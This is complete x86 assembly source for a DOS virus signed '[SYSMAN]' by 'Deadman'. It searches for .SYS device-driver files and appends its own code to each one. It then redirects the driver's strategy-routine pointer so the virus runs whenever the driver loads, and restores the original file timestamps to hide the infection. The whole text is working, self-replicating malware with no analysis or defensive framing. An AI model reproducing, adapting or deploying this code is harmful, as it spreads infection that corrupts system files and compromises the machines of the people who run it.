    model   tiny
    codeseg
    locals
    jumps

    start:         db      0b8h
    strategy       dw      000h
                   mov     cs:[6],ax

                   push    ax bx cx dx si di es ds

                   call    get_loc
    get_loc:       nop
                   pop     di
                   sub     di,offset get_loc

                   mov     ah,2fh
                   int     21h
                   push    es bx
                   push    cs cs
                   pop     ds es

                   mov     ah,1ah
                   lea     dx,dta+di
                   int     21h

                   mov     ah,4eh
                   mov     cx,20h
                   lea     dx,sys_mask+di
    keep_find:     int     21h
                   jc      no_more

                   mov     ax,3d02h
                   lea     dx,dta+di+1eh
                   int     21h
                   jc      next

                   xchg    ax,bx
                   mov     ax,5700h
                   int     21h
                   push    cx dx

                   mov     ah,3fh
                   mov     cx,10
                   lea     dx,buffer+di
                   int     21h
                   xor     cx,ax
                   jnz     close

                   cmp     word ptr buffer+di,0ffffh
                   jnz     close
                   cmp     word ptr dta+di+1ah+2,0
                   jnz     close
                   mov     ax,word ptr dta+di+1ah
                   cmp     ax,62000
                   ja      close
                   mov     dx,ax
                   sub     ax,vsize
                   cmp     ax,word ptr buffer+di+6
                   jz      close
                   xchg    word ptr buffer+di+6,dx
                   mov     word ptr strategy+di,dx

                   mov     ax,4202h
                   xor     cx,cx
                   cwd
                   int     21h
                   mov     ah,40h
                   mov     cx,vsize
                   mov     dx,di
                   int     21h
                   xor     cx,ax
                   jnz     close

                   mov     ax,4200h
                   cwd
                   int     21h
                   mov     ah,40h
                   mov     cx,10
                   lea     dx,buffer+di
                   int     21h
    close:         pop     dx cx
                   mov     ax,5701h
                   int     21h
                   mov     ah,3eh
                   int     21h
    next:          mov     ah,4fh
                   jmp     keep_find

    no_more:       pop     dx ds
                   mov     ah,1ah
                   int     21h
                   pop     ds es di si dx cx bx
                   sub     ax,ax
                   retn

    sys_mask       db      '*.SYS',0
                   db      '[SYSMAN]',0
                   db      'Copyright (C) 1998-99 Deadman',0

    vsize          equ     $-start

    buffer         db      10 dup (?)
    dta            db      43 dup (?)

                   end     start
